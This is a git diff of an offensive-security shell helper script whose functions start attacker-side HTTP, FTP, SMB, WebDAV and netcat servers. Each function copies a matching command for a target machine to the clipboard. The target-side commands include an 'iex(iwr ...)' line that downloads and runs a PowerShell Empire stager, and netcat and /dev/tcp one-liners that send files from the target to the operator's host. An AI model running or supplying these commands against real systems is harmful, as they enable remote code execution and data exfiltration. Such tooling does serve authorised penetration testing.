@@ -133,15 +133,7 @@ iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/${dp})
     sudo mv /var/lib/powershell-empire/empire/client/generated-stagers/${dp} $SV
 
     # Run the server
-    echo
-    cd "$SV" ; echo "$(hip) in $PWD" ; sudo python3 -m http.server 8000
-}
-
-nb-srv-web() {
-  pushd "$HOME/desktop/server" &> /dev/null
-  __info "Serving content at $(hip) in $PWD"
-	sudo python3 -m http.server 8000
-  popd &> /dev/null
+    nb-srv-web
 }
 
 nb-srv-uploadserver() {
@@ -156,21 +148,27 @@ nb-srv-uploadserver() {
   echo "$__COMMAND1" | wl-copy
   __info "2 Commands to use on a target system copied to clipboard"
 
-	print -z "sudo python3 -m uploadserver"
+  echo
+  pushd "$HOME/desktop/server" &> /dev/null
+  __info "Serving content at $(hip) in $PWD"
+	sudo python3 -m uploadserver
+  popd &> /dev/null
 }
 
 nb-srv-ftp-down() {
   nb-vars-set-lhost
   local filename && __askvar filename "FILENAME"
 
-  pushd "$HOME/desktop/server" &> /dev/null
   echo
   __COMMAND="(New-Object Net.WebClient).DownloadFile('ftp://${__LHOST}/$filename', 'C:\Users\Public\\$filename')"
   echo "$__COMMAND" | wl-copy
   __info "Command to use on a target system copied to clipboard"
-  popd &> /dev/null
 
-	print -z "sudo python -m pyftpdlib --port 21"
+  echo
+  pushd "$HOME/desktop/server" &> /dev/null
+  __info "Serving content at $(hip) in $PWD"
+	sudo python -m pyftpdlib --port 21
+  popd &> /dev/null
 }
 
 nb-srv-ftp-up() {
@@ -178,115 +176,106 @@ nb-srv-ftp-up() {
   local filename && __askvar filename "FILENAME"
   local path && __askvar path "FULL_PATH_TO_FILE"
 
-  pushd "$HOME/desktop/server" &> /dev/null
   echo
   __COMMAND=(New-Object Net.WebClient).UploadFile('ftp://${__LHOST}/$filename', '$path')
   echo "$__COMMAND" | wl-copy
   __info "Command to use on a target system copied to clipboard"
-  popd &> /dev/null
 
-  print -z "sudo python -m pyftpdlib --port 21 --write"
+  echo
+  pushd "$HOME/desktop/server" &> /dev/null
+  __info "Serving content at $(hip) in $PWD"
+  sudo python -m pyftpdlib --port 21 --write
+  popd &> /dev/null
 }
 
 nb-srv-smb() {
   nb-vars-set-lhost
   local filename && __askvar filename "FILENAME"
 
-  pushd "$HOME/desktop/server" &> /dev/null
   echo
   __COMMAND="copy \\${__LHOST}\share\\$filename"
   echo "$__COMMAND" | wl-copy
   __info "Command to use on a target system copied to clipboard"
-  popd &> /dev/null
 
-	print -z "sudo impacket-smbserver share -smb2support ./"
+  echo
+  pushd "$HOME/desktop/server" &> /dev/null
+  __info "Serving content at $(hip) in $PWD"
+	sudo impacket-smbserver share -smb2support ./
+  popd &> /dev/null
 }
 
 nb-srv-smb-http() {
   nb-vars-set-lhost
   local path && __askvar path "FULL_PATH_TO_FILE"
 
-  pushd "$HOME/desktop/server" &> /dev/null
   echo
   __COMMAND1="dir \\${__LHOST}\DavWWWRoot"
   __COMMAND2="copy $path \\${__LHOST}\DavWWWRoot"
   echo $__COMMAND2 | wl-copy
   echo $__COMMAND1 | wl-copy
   __info "2 Commands to use on a target system copied to clipboard"
-  popd &> /dev/null
 
-  print -z "sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous"
+  echo
+  pushd "$HOME/desktop/server" &> /dev/null
+  __info "Serving content at $(hip) in $PWD"
+  sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+  popd &> /dev/null
 }
 
 nb-srv-smb-auth() {
   nb-vars-set-lhost
   local filename && __askvar filename "FILENAME"
 
-  pushd "$HOME/desktop/server" &> /dev/null
   echo
   __COMMAND1="net use n: \\${__LHOST}\share /user:test test"
   __COMMAND2="copy n:\\$filename"
   echo "$__COMMAND2" | wl-copy
   echo "$__COMMAND1" | wl-copy
   __info "2 Commands to use on a target system copied to clipboard"
-  popd &> /dev/null
 
   # New versions of Windows block unauthenticated guest access, to bypass set username and pass
-	print -z "sudo impacket-smbserver share -smb2support ./ -user test -password test"
+  echo
+  pushd "$HOME/desktop/server" &> /dev/null
+  __info "Serving content at $(hip) in $PWD"
+	sudo impacket-smbserver share -smb2support ./ -user test -password test
+  popd &> /dev/null
+}
+
+nb-srv-web() {
+  nb-vars-set-lport
+
+  pushd "$HOME/desktop/server" &> /dev/null
+  __info "Serving content at $(hip) in $PWD"
+	sudo python3 -m http.server ${__LPORT}
+  popd &> /dev/null
 }
 
 nb-srv-ngrok() {
   pushd "$HOME/desktop/server" &> /dev/null
-  print -z "ngrok http 4444"
+  __info "Serving content at $(hip) in $PWD"
+  ngrok http 4444
   popd &> /dev/null
 }
 
 nb-srv-tftp() {
   pushd "$HOME/desktop/server" &> /dev/null
-	print -z "sudo service atftpd start"
+  __info "Serving content at $(hip) in $PWD"
+	sudo service atftpd start
   popd &> /dev/null
 }
 
 nb-srv-smtp() {
   pushd "$HOME/desktop/server" &> /dev/null
-	print -z "sudo python -m smtpd -c DebuggingServer -n 0.0.0.0:25"
+  __info "Serving content at $(hip) in $PWD"
+	sudo python -m smtpd -c DebuggingServer -n 0.0.0.0:25
   popd &> /dev/null
 }
 
 nb-srv-updog() {
   pushd "$HOME/desktop/server" &> /dev/null
-  print -z "updog -p 443 --ssl -p $(__rand 10)"
+  __info "Serving content at $(hip) in $PWD"
+  updog -p 443 --ssl -p $(__rand 10)
   popd &> /dev/null
-}
-
-nb-srv-nc-tar() {
-    nb-vars-set-lhost
-    nb-vars-set-lport
-    __COMMAND="tar cfv - /path/to/send | nc ${__LHOST} ${__LPORT}"
-    echo "$__COMMAND" | wl-copy
-    __info "Command to use on a target system copied to clipboard"
-
-    print -z "nc -nvlp ${__LPORT} | tar xfv -"
-}
-
-nb-srv-nc-file() {
-    nb-vars-set-lhost
-    nb-vars-set-lport
-    __COMMAND="cat FILE > /dev/tcp/${__LHOST}/${__LPORT}"
-    echo "$__COMMAND" | wl-copy
-    __info "Command to use on a target system copied to clipboard"
-
-    print -z "nc -nvlp ${__LPORT} -w 5 > incoming.txt"  
-}
-
-nb-srv-nc-b64() {
-    nb-vars-set-lhost
-    nb-vars-set-lport
-    __COMMAND="openssl base64 -in FILE > /dev/tcp/${__LHOST}/${__LPORT}"
-    echo "$__COMMAND" | wl-copy
-    __info "Command to use on a target system copied to clipboard"
-
-    print -z "nc -nvlp ${__LPORT} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt"  
 }
 
 nb-srv-nc-b64-web() {
@@ -301,5 +290,41 @@ nb-srv-nc-b64-web() {
     echo "$__COMMAND1" | wl-copy
     __info "2 Commands to use on a target system copied to clipboard"
 
-    print -z "nc -lvnp ${__LPORT} -w 5 > incoming.b64 && echo '$(cat incoming.b64)' | base64 -d -w 0 > decoded.txt"
+    pushd "$HOME/desktop/server" &> /dev/null
+    nc -lvnp ${__LPORT} -w 5 > incoming.b64 && echo '$(cat incoming.b64)' | base64 -d -w 0 > decoded.txt
+    popd &> /dev/null
+}
+
+
+
+
+
+nb-srv-nc-tar() {
+    nb-vars-set-lhost
+    nb-vars-set-lport
+    __COMMAND="tar cfv - /path/to/send | nc ${__LHOST} ${__LPORT}"
+    echo "$__COMMAND" | wl-copy
+    __info "Command to use on a target system copied to clipboard"
+
+    nc -nvlp ${__LPORT} | tar xfv -
+}
+
+nb-srv-nc-file() {
+    nb-vars-set-lhost
+    nb-vars-set-lport
+    __COMMAND="cat FILE > /dev/tcp/${__LHOST}/${__LPORT}"
+    echo "$__COMMAND" | wl-copy
+    __info "Command to use on a target system copied to clipboard"
+
+    nc -nvlp ${__LPORT} -w 5 > incoming.txt
+}
+
+nb-srv-nc-b64() {
+    nb-vars-set-lhost
+    nb-vars-set-lport
+    __COMMAND="openssl base64 -in FILE > /dev/tcp/${__LHOST}/${__LPORT}"
+    echo "$__COMMAND" | wl-copy
+    __info "Command to use on a target system copied to clipboard"
+
+    nc -nvlp ${__LPORT} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt
 }
